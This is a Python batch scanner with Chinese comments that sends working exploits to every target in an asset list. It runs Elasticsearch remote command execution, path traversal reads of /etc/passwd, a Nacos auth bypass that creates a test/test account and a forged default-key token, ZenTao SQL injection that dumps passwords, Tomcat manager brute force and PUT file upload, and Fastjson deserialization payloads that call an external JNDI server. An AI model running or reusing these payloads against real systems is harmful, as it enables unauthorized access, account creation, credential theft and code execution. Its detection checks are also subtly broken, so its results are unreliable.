#!/usr/bin/python
import requests
import basic
import sys
from datetime import datetime
from base64 import b64encode
from config import tomcat_user_dir
from config import tomcat_pass_dir
from config import nacos_user_dir
from config import nacos_pass_dir
import json

from config import jndi_server


# elasticsearch数据库相关漏洞扫描
def es_unauthorized():

    hearder={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
    }

    exec_header = {
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    pass_header = {
        'User-Agent': 'Mozilla/5.0 (compatible; Elasticsearch; +http://www.elastic.co/)',
        'Accept': '*/*',
        'Connection': 'close'
    }

    # 设置请求正文
    exec_data = {
        'size': 1,
        'query': {
            'filtered': {
                'query': {
                    'match_all': {}
                }
            }
        },
        'script_fields': {
            'command': {
                'script': "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
            }
        }
    }

    # 资产文件存入列表
    url_list = basic.url_file_ip_list()

    # 提取es资产存入列表
    try:
        es_url_list = []
        for i in url_list:
            if ':9200' in i:
                es_url_list.append(i)
    except Exception as e:
        print("捕获到异常:", e)
    
    # 循环es资产列表判断是否存在未授权访问漏洞
    for url in es_url_list:
        # 获取当前时间
        now = datetime.now()

        # 格式化时间，只保留时、分、秒
        formatted_time = now.strftime("%H:%M:%S")
        # 未授权访问漏洞
        try:
            # 忽略ssl证书验证
            res = requests.get(url,headers=hearder,allow_redirects=False,timeout=2,verify=False)
            res.encoding='utf-8'
            restext = res.text
            if 'cluster_name' and 'cluster_uuid' and 'version' in restext:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在未授权访问漏洞")
        except:
            pass

        # elasticsearch远程命令执行漏洞
        cmd_exec_dir = "/_search?pretty"
        # 将数据转换为 JSON 格式
        json_data = requests.compat.json.dumps(exec_data)
        # 发送 POST 请求
        try:
            es_data_response = requests.post(url+cmd_exec_dir, headers=exec_header, data=json_data, allow_redirects=False,timeout=2,verify=False)
            es_data_response.encoding='utf-8'
            es_data_response_text = es_data_response.text
            es_data_response_json = json.loads(es_data_response_text)
            exec_result = es_data_response_json['hits']['hits'][0]['fields']['command'][0]
            if 'command' and 'uid' and 'gid' and 'groups' in es_data_response_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+cmd_exec_dir+" "+"存在远程命令执行漏洞"+" "+"("+exec_result+")")
        except:
            pass

        # elasticsearch目录穿越漏洞
        es_pass_dir = '/_plugin/head/../../../../../../../../../etc/passwd'
        try:
            # 忽略ssl证书验证
            res_pass = requests.get(url+es_pass_dir,headers=pass_header,allow_redirects=False,timeout=2,verify=False)
            res_pass.encoding='utf-8'
            res_pass_text = res_pass.text
            if '/bin/bash' and '/usr/sbin/nologin' and 'bin' in res_pass_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+es_pass_dir+" "+"存在目录穿越漏洞")
        except:
            pass





# nacos漏洞扫描
def nacos_vuln_scan():
    hearders = {
        'User-Agent': 'Nacos-Server',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i'
    }

    # 资产文件存入列表
    url_list = basic.url_file_ip_list()
    # 遍历列表判断是否存在nacos默认配置未授权访问漏洞
    for url in url_list:
        # 获取当前时间
        now = datetime.now()
        # 格式化时间，只保留时、分、秒
        formatted_time = now.strftime("%H:%M:%S")

        # 验证nacos默认配置未授权访问漏洞
        poc_dir = "/nacos/v1/auth/users?pageNo=1&pageSize=9"
        try:
            # 忽略ssl证书验证
            res = requests.get(url+poc_dir,headers=hearders,allow_redirects=False,timeout=2,verify=False)
            res.encoding='utf-8'
            restext = res.text
            if 'totalCount' and 'username' and 'password' in restext:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+poc_dir+" "+"存在nacos默认配置未授权访问漏洞")
        except:
            pass

        # 验证nacos权限绕过漏洞，并新增用户（test/test）
        auth_poc_dir = "/nacos/v1/auth/users"
        # POST请求参数
        data = {
            'username':'test',
            'password':'test'
        }
        try:
            # 发送POST请求,忽略ssl验证
            response = requests.post(url+auth_poc_dir, data=data, headers=hearders,allow_redirects=False,timeout=2,verify=False)
            response.encoding='utf-8'
            response_text = response.text
            if '200' and 'create' and 'user' and 'ok' in response_text:
                 # 忽略ssl证书验证
                res = requests.get(url+poc_dir,headers=hearders,allow_redirects=False,timeout=2,verify=False)
                res.encoding='utf-8'
                restext = res.text
                if 'test' and 'username' in restext:
                    print("[+]"+" "+formatted_time+" "+"目标："+" "+url+poc_dir+" "+"存在权限绕过漏洞并新增用户(test/test)")
        except:
            pass

        # Nacos Derby SQL注入漏洞验证
        nacos_sql_inject_dir = "/nacos/v1/cs/ops/derby?sql=%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73"
        try:
            # 忽略ssl证书验证
            res_sql = requests.get(url+nacos_sql_inject_dir,headers=hearders,allow_redirects=False,timeout=2,verify=False)
            res_sql.encoding='utf-8'
            res_sql_text = res_sql.text
            if '200' and 'USERNAME' and 'PASSWORD' and 'true' in res_sql_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+nacos_sql_inject_dir+" "+"存在 Nacos Derby SQL注入漏洞")
        except:
            pass

        # nacos默认密钥导致的未授权访问漏洞
        nacos_secret_dir = "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9"
        try:
            # 忽略ssl证书验证
            res_secret = requests.get(url+nacos_secret_dir,headers=hearders,allow_redirects=False,timeout=1,verify=False)
            res_secret.encoding='utf-8'
            res_secret_text = res_secret.text
            if 'totalCount' and 'username' and 'password' and 'pageItems' in res_secret_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+nacos_secret_dir+" "+"存在 Nacos secret.key默认密钥 未授权访问漏洞")
        except:
            pass

        # nacos常见弱口令扫描
        weakpassword_dir = "/nacos/v1/auth/users/login"

        # 通过字典文件生成
        user_list = []
        file_user = open(nacos_user_dir,encoding='utf-8')
        for userline in file_user.readlines():
            user_list.append(userline.strip())
    
        pass_list = []
        file_pass = open(nacos_pass_dir,encoding='utf-8')
        for passline in file_pass.readlines():
            pass_list.append(passline.strip())
        # 使用列表推导式生成包含多个字典的列表
        nacos_dict_list = [{'username': username, 'password': password} for username in user_list for password in pass_list]
        
        try:
            for auth in nacos_dict_list:
                # 发送POST请求,忽略ssl验证
                response_weak = requests.post(url+weakpassword_dir, data=auth, headers=hearders,allow_redirects=False,timeout=2,verify=False)
                response_weak.encoding='utf-8'
                response_weak_text = response_weak.text
    
                if '200' and 'Authorization' and 'accessToken' and 'username' in response_weak_text:
                    
                    print("[+]"+" "+formatted_time+" "+"目标："+" "+url+weakpassword_dir+" "+"存在nacos弱口令漏洞:"+"("+auth['username']+"/"+auth['password']+")")
        except:
            pass



# 禅道漏洞批量扫描
def chandao_vuln_scan():
    url_list = basic.url_file_ip_list()
    for url in url_list:
        hearder={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
        }

        # 获取当前时间
        now = datetime.now()
        # 格式化时间，只保留时、分、秒
        formatted_time = now.strftime("%H:%M:%S")

        # 验证禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞
        chandao_file_read_dir = "/api-getModel-file-parseCSV-fileName=/etc/passwd"
        try:
            # 忽略ssl证书验证
            res_readfile = requests.get(url+chandao_file_read_dir,headers=hearder,allow_redirects=False,timeout=1,verify=False)
            res_readfile.encoding='utf-8'
            res_readfile_text = res_readfile.text
            if 'success' and 'data' and 'md5' in res_readfile_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+chandao_file_read_dir+" "+"存在禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞")
        except:
            pass
        
        # 禅道 11.6 api-getModel-api-sql-sql 后台SQL注入漏洞
        chandao_api_sql_dir = "/api-getModel-api-sql-sql=select+account,password+from+zt_user"
        
        try:
            # 忽略ssl证书验证
            res_api_sql = requests.get(url+chandao_api_sql_dir,headers=hearder,allow_redirects=False,timeout=2,verify=False)
            res_api_sql.encoding='utf-8'
            res_api_sql_text = res_api_sql.text
            if 'password' and '\"account\"\:\"zentao\"' in res_api_sql_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+chandao_api_sql_dir+" "+"存在禅道 11.6 api-getModel-api-sql-sql 后台SQL注入漏洞")
        except:
            pass



# tomcat 相关漏洞扫描
def tomcat_vuln_scan():
    # 通过字典文件生成
    user_list = []
    file_user = open(tomcat_user_dir,encoding='utf-8')
    for userline in file_user.readlines():
        user_list.append(userline.strip())

    pass_list = []
    file_pass = open(tomcat_pass_dir,encoding='utf-8')
    for passline in file_pass.readlines():
        pass_list.append(passline.strip())
    # 使用列表推导式生成包含多个字典的列表
    tomcat_dict_list = [{'username': username, 'password': password} for username in user_list for password in pass_list]
    
    # 获取当前时间
    now = datetime.now()
    # 格式化时间，只保留时、分、秒
    formatted_time = now.strftime("%H:%M:%S")
    url_list = basic.url_file_ip_list()
    # tomcat后台口令暴力破解
    # 修改路径为/manager/html
    manager_dir_list = []
    for url in url_list:
        manager_dir_list.append(url+"/manager/html")
    
    for manager_url in manager_dir_list:

        # 基本认证信息，用户名和密码
        for auth in tomcat_dict_list:
            username = auth['username']
            password = auth['password']

            auth_str = f'{username}:{password}'
            encoded_auth_str = b64encode(auth_str.encode()).decode()
            
            # HTTP头部信息
            headers = {
                'Cache-Control': 'max-age=0',
                'Authorization': f'Basic {encoded_auth_str}',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
                'Connection': 'close'
            }
            
            # 捕获异常处理
            try:
                # 发送GET请求
                response_weakpassword_tomcat = requests.get(manager_url, headers=headers,allow_redirects=False,timeout=1,verify=False)
                response_weakpassword_tomcat.encoding='utf-8'
                response_weakpassword_tomcat_text = response_weakpassword_tomcat.text
                if 'Tomcat Web应用程序管理者' and '启动' and '停止' and '重新加载' in response_weakpassword_tomcat_text:
                    print("[+]"+" "+formatted_time+" "+"目标："+" "+manager_url+" "+"存在tomcat管理后台弱口令:"+"("+username+"/"+password+")")
            except:
                pass
    
    # tomcat样例目录扫描
    example_dir_list = []
    for example_url in url_list:
        example_dir_list.append(example_url+"/examples/")
    headers_exam = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Connection': 'close'
            }
    for exam_urll in example_dir_list:
        # 捕获异常处理
        try:
            # 发送GET请求
            example_response = requests.get(exam_urll, headers=headers_exam,allow_redirects=False,timeout=1,verify=False)
            example_response.encoding='utf-8'
            example_response_text = example_response.text
            if 'Servlets examples' and 'JSP Examples' and 'WebSocket Examples' in example_response_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+exam_urll+" "+"存在tomcat样例目录泄露漏洞")
        except:
            pass
        


    # Tomcat PUT方法任意写文件漏洞
    code_exec_dir = '/test.txt'
    test_data = 'hello world'
    # 遍历列表批量尝试上传文件
    for exec_code_url in url_list:
        try:
            # 尝试上传测试文件
            requests.put(exec_code_url+code_exec_dir+'/',data=test_data)
            # 验证是否上传成功
            code_res = requests.get(exec_code_url+code_exec_dir)
            code_res.encoding='utf-8'
            code_res_text = code_res.text
            if 'hello world' in code_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+exec_code_url+code_exec_dir+" "+"存在Tomcat PUT方法任意写文件漏洞")
        except:
            pass

# fastjson相关漏洞扫描
def fastjson_vuln_scan():
    url_list = basic.url_file_ip_list()
    # 获取当前时间
    now = datetime.now()
    # 格式化时间，只保留时、分、秒
    formatted_time = now.strftime("%H:%M:%S")
    fastjson_header = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Connection': 'close',
        'Content-Type': 'application/json',
        'Content-Length': '160'
    }
    # 构造POST请求的body-1.2.24版本
    fastjson_data = {  
        "b": {  
            "@type": "com.sun.rowset.JdbcRowSetImpl",  
            "dataSourceName": jndi_server,  
            "autoCommit": True  
        }  
    }
    # 构造POST请求的body-1.2.47版本
    fastjson_data_v2 = {
        
        "a":{
            "@type":"java.lang.Class",
            "val":"com.sun.rowset.JdbcRowSetImpl"
        },
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":jndi_server,
            "autoCommit":True
    }
}
    # 将data字典转换为JSON字符串  
    data_json = json.dumps(fastjson_data) 
    data_json_v2 = json.dumps(fastjson_data_v2)
    for url in url_list:
        # fastjson 1.2.24反序列化漏洞
        try:
            # 发送POST请求  
            fastjson_response = requests.post(url, headers=fastjson_header, data=data_json,allow_redirects=False,verify=False,timeout=30)
            fastjson_response.encoding='utf-8'
            fastjson_response_text = fastjson_response.text
            if 'timestamp' and '500' and 'Internal Server Error' and 'set property error, autoCommit' in fastjson_response_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在fastjson1.2.24反序列漏洞,请检查JNDI服务日志确认是否成功执行")
        except:
            pass

        # fastjson 1.2.47反序列化漏洞
        try:
            # 发送POST请求  
            fastjson_response_v2 = requests.post(url, headers=fastjson_header, data=data_json_v2,allow_redirects=False,verify=False,timeout=30)
            fastjson_response_v2.encoding='utf-8'
            fastjson_response_v2_text = fastjson_response_v2.text
            if 'timestamp' and '400' and 'Bad Request' and 'set property error, autoCommit' and 'com.alibaba.fastjson.JSONException' in fastjson_response_v2_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在fastjson1.2.47反序列漏洞,请检查JNDI服务日志确认是否成功执行")
        except:
            pass

# 蓝凌OA漏洞扫描，正在完善中
def lanlingoa_vuln_scan():
    url_list = basic.url_file_ip_list()
   
    # 获取当前时间
    now = datetime.now()
    # 格式化时间，只保留时、分、秒
    formatted_time = now.strftime("%H:%M:%S")
    # 任意文件读取路径
    file_read_dir = "/sys/ui/extend/varkind/custom.jsp"
    lanlingoa_header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Length': '42',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip'
    }

    data = 'var={"body":{"file":"file:///etc/passwd"}}'
    
    for url in url_list:
        try:
            # 发送POST请求
            lanling_response = requests.post(url+file_read_dir, headers=lanlingoa_header, data=data,allow_redirects=False,verify=False,timeout=1)
            lanling_response.encoding='utf-8'
            lanling_response_text = lanling_response.text
            
            if 'root' and '/bin/bash' in lanling_response_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+file_read_dir+" "+"存在蓝凌OA任意文件读取漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+file_read_dir+" "+"不存在蓝凌OA任意文件读取漏洞")
        except:
            pass
    






if __name__ == "__main__":
    if len(sys.argv) > 1:
        func_name = sys.argv[1]
        if func_name == 'es_unauthorized':
            es_unauthorized()
        elif func_name == 'nacos_vuln_scan':
            nacos_vuln_scan()
        elif func_name == 'chandao_vuln_scan':
            chandao_vuln_scan()
        elif func_name == 'tomcat_vuln_scan':
            tomcat_vuln_scan()
        elif func_name == 'fastjson_vuln_scan':
            fastjson_vuln_scan()
        elif func_name == 'lanlingoa_vuln_scan':
            lanlingoa_vuln_scan()    
        else:
            print("Invalid function number")
    else:
        print("No function number provided")